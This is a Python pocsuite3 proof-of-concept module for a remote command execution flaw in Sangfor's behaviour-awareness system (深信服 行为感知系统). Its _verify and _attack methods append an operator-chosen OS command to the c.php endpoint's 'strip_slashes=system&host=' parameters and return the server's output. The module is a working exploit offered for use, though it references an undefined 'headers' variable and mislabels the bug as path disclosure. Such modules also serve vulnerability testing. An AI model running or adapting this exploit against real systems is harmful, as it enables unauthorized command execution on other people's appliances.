import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '12'  
    author = ['']
    name = '深信服 行为感知系统 c.php 远程命令执行漏洞'
    desc = '''深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行
    '''
    appPowerLink = '深信服'
    appName = '深信服 行为感知系统'
    appVersion = '未知版本'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString("ipconfig", description='命令执行自定义命令')
        return o

    def _verify(self):
        result = {}
        url = self.url + "/tool/log/c.php?strip_slashes=system&host=" + self.get_option("cmd")
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200 and "Windows IP" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("cmd")
                result['VerifyInfo']['Response'] = r.text
        except:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url + "/tool/log/c.php?strip_slashes=system&host=" + self.get_option("cmd")
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("cmd")
                result['VerifyInfo']['Response'] = r.text
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)